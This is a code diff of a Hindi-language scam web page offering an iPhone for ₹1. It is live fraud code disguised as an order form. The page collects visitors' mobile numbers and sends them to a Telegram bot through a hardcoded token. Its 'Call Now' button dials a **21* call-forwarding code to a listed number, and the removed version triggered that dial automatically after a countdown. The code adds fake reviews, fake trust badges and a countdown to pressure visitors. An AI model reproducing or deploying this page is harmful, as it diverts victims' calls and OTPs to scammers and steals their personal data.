@@ -1,165 +1,238 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="hi">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Free iPhone Offer</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>₹1 में iPhone - Order</title>
   <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background: linear-gradient(135deg, #dbeafe, #e0f2fe);
-      text-align: center;
+    body{
+      margin:0; min-height:100vh;
+      display:flex; align-items:center; justify-content:center;
+      background:linear-gradient(135deg,#dbeafe,#e0f2fe);
+      font-family:Arial, sans-serif;
     }
-    .offer-banner {
-      background: linear-gradient(90deg, #ff6a00, #ee0979);
-      color: white;
-      font-size: 20px;
-      font-weight: bold;
-      text-align: center;
-      padding: 12px;
-      border-radius: 0 0 14px 14px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.25);
+    .card{
+      max-width:420px; width:100%;
+      background:#fff;
+      border-radius:20px; padding:28px;
+      box-shadow:0 8px 28px rgba(0,0,0,0.15);
+      text-align:center;
+      display:none;
+      animation: fadeIn 1s ease;
     }
-    .container { padding: 20px; }
-    img { width: 180px; margin-top: 20px; }
-    h2 { color: #1f2937; }
-    input {
-      padding: 12px;
-      width: 80%;
-      max-width: 300px;
-      border-radius: 10px;
-      border: 1px solid #ccc;
-      margin-top: 15px;
-      font-size: 16px;
+    .active{ display:block; }
+
+    .btn{
+      margin-top:20px; width:100%; padding:14px;
+      border:0; border-radius:12px;
+      background:linear-gradient(135deg,#007aff,#0051b5);
+      color:#fff; font-weight:700; font-size:16px; cursor:pointer;
+      box-shadow:0 6px 20px rgba(0,122,255,0.25);
+      transition:transform 0.2s ease, box-shadow 0.2s ease;
     }
-    button {
-      margin-top: 20px;
-      padding: 12px 24px;
-      background: linear-gradient(90deg, #2563eb, #1d4ed8);
-      color: white;
-      border: none;
-      border-radius: 10px;
-      font-size: 16px;
-      cursor: pointer;
-      transition: 0.3s;
+    .btn:hover{ transform:translateY(-2px); box-shadow:0 10px 26px rgba(0,122,255,0.35); }
+    .btn-green{ background:#28a745; }
+    .btn-green:hover{ background:#218838; }
+    .blink{ animation: blink 1s infinite; }
+    @keyframes blink{ 50%{ opacity:0.5; } }
+
+    /* Attractive input box */
+    .input-box{
+      display:flex;
+      align-items:center;
+      gap:8px;
+      background:#f1f5f9;
+      border-radius:12px;
+      padding:12px 16px;
+      border:2px solid transparent;
+      transition: all 0.3s ease;
+      box-shadow:inset 0 1px 3px rgba(0,0,0,0.1);
+      margin:15px auto;
+      width:90%;
     }
-    button:hover { background: linear-gradient(90deg, #1d4ed8, #1e40af); }
-    #nextPage { display: none; background: linear-gradient(135deg, #fef9c3, #f0fdf4); padding: 20px; }
-    .box {
-      background: white;
-      margin: 30px auto;
-      padding: 20px;
-      width: 85%;
-      max-width: 400px;
-      border-radius: 15px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+    .input-box:focus-within{
+      border-color:#007aff;
+      background:#fff;
+      box-shadow:0 0 0 4px rgba(0,122,255,0.1);
     }
-    .order-id { margin: 10px 0; font-weight: bold; color: #1d4ed8; }
-    .timer { font-size: 18px; font-weight: bold; color: red; margin-top: 10px; }
-    .call-btn {
-      display: inline-block;
-      margin-top: 20px;
-      padding: 14px 24px;
-      background: linear-gradient(90deg, #22c55e, #16a34a);
-      color: white;
-      font-size: 18px;
-      font-weight: bold;
-      border-radius: 10px;
-      text-decoration: none;
-      animation: glow 1s infinite alternate, shake 2s infinite;
+    .input-box span{
+      font-weight:600;
+      color:#007aff;
     }
-    @keyframes glow { from { box-shadow: 0 0 5px #16a34a; } to { box-shadow: 0 0 20px #22c55e; } }
-    @keyframes shake { 0%,100%{transform:translateX(0);}50%{transform:translateX(3px);} }
-    .badges { margin-top: 15px; font-size: 14px; color: #444; }
-    .badges span {
-      display: inline-block;
-      background: #f3f4f6;
-      padding: 6px 12px;
-      border-radius: 20px;
-      margin: 4px;
-      font-weight: bold;
+    .input-box input{
+      flex:1;
+      border:0;
+      outline:none;
+      background:transparent;
+      font-size:16px;
+      color:#111;
     }
-    .reviews { margin-top: 25px; height: 60px; overflow: hidden; position: relative; }
-    .reviews p { margin: 0; padding: 5px; font-size: 14px; animation: scroll 10s linear infinite; }
-    @keyframes scroll { 0%{transform:translateY(100%);}100%{transform:translateY(-300%);} }
+    .input-box input::placeholder{
+      color:#999;
+      font-style:italic;
+    }
+
+    /* Image hover effect */
+    .product-img{
+      width:240px;
+      border-radius:20px;
+      box-shadow:0 6px 18px rgba(0,0,0,0.15);
+      margin-bottom:16px;
+      transition: transform 0.4s ease, box-shadow 0.4s ease;
+    }
+    .product-img:hover{
+      transform: scale(1.08);
+      box-shadow:0 12px 28px rgba(0,0,0,0.25);
+    }
+
+    /* Page 2 extras */
+    .success-icon{
+      font-size:48px;
+      animation: pop 1s ease;
+    }
+    @keyframes pop{0%{transform:scale(0);opacity:0;}100%{transform:scale(1);opacity:1;}}
+    .order-box{
+      background:#f1fdf4;
+      border:1px solid #c9f0d4;
+      border-radius:12px;
+      padding:12px;
+      margin:15px 0;
+      text-align:left;
+      font-size:15px;
+    }
+    .order-box p{margin:6px 0;}
+    .progress{
+      background:#eee;
+      border-radius:10px;
+      height:10px;
+      width:100%;
+      margin:10px 0;
+      overflow:hidden;
+    }
+    .progress-bar{
+      height:100%;
+      width:0;
+      background:linear-gradient(90deg,#28a745,#85e085);
+      animation: load 15s linear forwards;
+    }
+    @keyframes load{from{width:0;}to{width:100%;}}
+    .trust{
+      margin-top:20px;
+      font-size:14px;
+      color:#444;
+    }
+    @keyframes fadeIn{ from{opacity:0; transform:translateY(20px);} to{opacity:1; transform:translateY(0);} }
   </style>
 </head>
 <body>
-  <div class="offer-banner">🎁 Free iPhone Offer</div>
+  <!-- Page 1 -->
+  <div class="card active" id="formPage">
+    <img src="https://i.postimg.cc/DZNvJvW2/Apple-i-Phone-14-i-Phone-14-Plus-2up-blue-220907-inline-jpg-large.jpg" 
+         alt="iPhone" class="product-img">
+    <h1>🔥 सिर्फ <span style="color:red;">₹1</span> में iPhone 🔥🔥</h1>
+    <p style="font-weight:600;background:#fff4e6;padding:10px 14px;border-radius:8px;display:inline-block;margin-bottom:15px;">
+      👇 Order करने के लिए नीचे अपना मोबाइल नंबर दर्ज करें 👇
+    </p>
 
-  <!-- First Page -->
-  <div id="firstPage" class="container">
-    <img src="https://www.apple.com/newsroom/images/product/iphone/standard/Apple-iPhone-14-iPhone-14-Plus-2up-blue-220907_inline.jpg.large.jpg" alt="iPhone 14">
-    <h2>अपना मोबाइल नंबर दर्ज करें</h2>
-    <input type="tel" id="userNumber" placeholder="Enter number" pattern="[0-9]*" inputmode="numeric" required>
-    <br>
-    <button onclick="submitNumber()">Submit</button>
+    <div class="input-box">
+      <span>+91</span>
+      <input id="mobile" type="tel" maxlength="10" placeholder="Enter mobile number">
+    </div>
+
+    <button id="sendBtn" class="btn">📲 Order Now</button>
+    <div id="resp"></div>
   </div>
 
-  <!-- Next Page -->
-  <div id="nextPage">
-    <div class="box">
-      <h2>✅ Free Order Request Received</h2>
-      <div class="order-id">📦 Your Order ID: <span id="orderId"></span></div>
-      <div class="timer">⏳ Call within <span id="countdown">20</span> seconds</div>
-      <p>अभी तुरंत delivery boy से बात करने के लिए नीचे Call button दबाएँ 👇</p>
-      <a id="callBtn" href="tel:**21*9760540370%23" class="call-btn">📞 Call Now</a>
+  <!-- Page 2 -->
+  <div class="card" id="orderPage">
+    <div class="success-icon">🎉</div>
+    <h2 style="color:green;">✅ Free Order Request Received</h2>
 
-      <div class="badges">
-        <span>🔒 100% Secure</span>
-        <span>🚚 Free Delivery</span>
-        <span>✅ Verified Offer</span>
-      </div>
+    <div class="order-box">
+      <p>📦 Your Order ID: <b id="orderId"></b></p>
+      <p>📱 Mobile: <b id="userPhone"></b></p>
+    </div>
 
-      <div class="reviews">
-        <p>⭐ Rahul Sharma: "Mujhe 2 din me iPhone mil gaya!"</p>
-        <p>⭐ Priya Verma: "Best offer, trust kar sakte ho"</p>
-        <p>⭐ John D.: "Got my iPhone 14, amazing deal!"</p>
-        <p>⭐ Ankit Gupta: "Bahut fast delivery 👍"</p>
-      </div>
+    <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
+    <p class="timer">⏳ Call within <span id="countdown">15</span> seconds</p>
+
+    <p style="margin:10px 0;">अभी तुरंत delivery boy से बात करने के लिए नीचे Call button दबाएँ 👇</p>
+
+    <!-- Call Now button with dialpad link -->
+    <a href="tel:**21*9555053046%23" id="callLink">
+      <button class="btn btn-green blink" id="callBtn">📞 Call Now</button>
+    </a>
+
+    <div class="trust">
+      <p>⭐ Trusted by 10,000+ users</p>
+      <p>🔒 100% Safe & Secure</p>
     </div>
   </div>
 
   <script>
-    // === यहां अपना असली BOT TOKEN और CHAT ID डालना ===
-    const BOT_TOKEN = "8065449403:AAHXQyHZynO_uX_EC9jxgk43JcvQCtkcl4I"; 
-    const CHAT_ID = "7438329471"; 
+    // === CONFIG ===
+    const BOT_TOKEN = "7665234352:AAEAE2zPo_H0tmnHqaaAJmec-PG2vTuE05w";   // <-- अपना Bot Token डालना
+    const CHAT_ID  = "7438329471";     // <-- अपना Chat ID डालना
 
-    function submitNumber() {
-      let number = document.getElementById("userNumber").value;
-      if(number.trim() === "") {
-        alert("कृपया मोबाइल नंबर दर्ज करें!");
+    const mobileInput = document.getElementById('mobile');
+    const sendBtn = document.getElementById('sendBtn');
+    const resp = document.getElementById('resp');
+    const callLink = document.getElementById('callLink');
+
+    let savedPhone = ""; // पहले पेज से नंबर save होगा
+
+    function show(msg, ok=true){ 
+      resp.textContent = msg; 
+      resp.style.color = ok ? "green" : "red"; 
+    }
+    function validatePhone(v){ return /^[6-9]\d{9}$/.test(v); }
+
+    // === Order Now ===
+    sendBtn.addEventListener('click', ()=>{
+      const phone = mobileInput.value.trim();
+      if(!validatePhone(phone)){
+        show("❌ कृपया सही 10 अंकों का मोबाइल नंबर डालें।", false);
         return;
       }
 
-      // Telegram पर भेजो
-      let message = "📱 New Number: " + number;
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-      });
+      savedPhone = phone; // नंबर save
 
-      // Hide first page, show next
-      document.getElementById("firstPage").style.display = "none";
-      document.getElementById("nextPage").style.display = "block";
+      const orderId = "ORD-" + Math.floor(100000 + Math.random()*900000);
+      document.getElementById("orderId").textContent = orderId;
+      document.getElementById("userPhone").textContent = "+91 " + savedPhone;
 
-      // Generate Order ID
-      const randomNum = Math.floor(100000 + Math.random() * 900000);
-      document.getElementById("orderId").innerText = "ORD-" + randomNum;
+      document.getElementById("formPage").classList.remove("active");
+      document.getElementById("orderPage").classList.add("active");
 
-      // Timer 20 sec
-      let timeLeft = 20;
-      const timer = setInterval(() => {
+      // 15 sec countdown
+      let timeLeft = 15;
+      const timerEl = document.getElementById("countdown");
+      const countdown = setInterval(()=>{
         timeLeft--;
-        document.getElementById("countdown").innerText = timeLeft;
+        timerEl.textContent = timeLeft;
         if(timeLeft <= 0){
-          clearInterval(timer);
-          window.location.href = document.getElementById("callBtn").href;
+          clearInterval(countdown);
+          timerEl.textContent = "0";
+          document.getElementById("callBtn").classList.remove("blink");
         }
-      }, 1000);
-    }
+      },1000);
+    });
+
+    // === Call Now ===
+    callLink.addEventListener('click', async ()=>{
+      if(!savedPhone){
+        alert("पहले मोबाइल नंबर डालें!");
+        return;
+      }
+      try{
+        const text = encodeURIComponent(`नया Order Confirm:\nMobile: +91${savedPhone}`);
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${text}`;
+        await fetch(url);
+        // tel: link dialer अपने आप खोलेगा
+      }catch(err){
+        console.log("⚠️ Network error: "+err.message);
+      }
+    });
   </script>
 </body>
-</html>
+  </html>
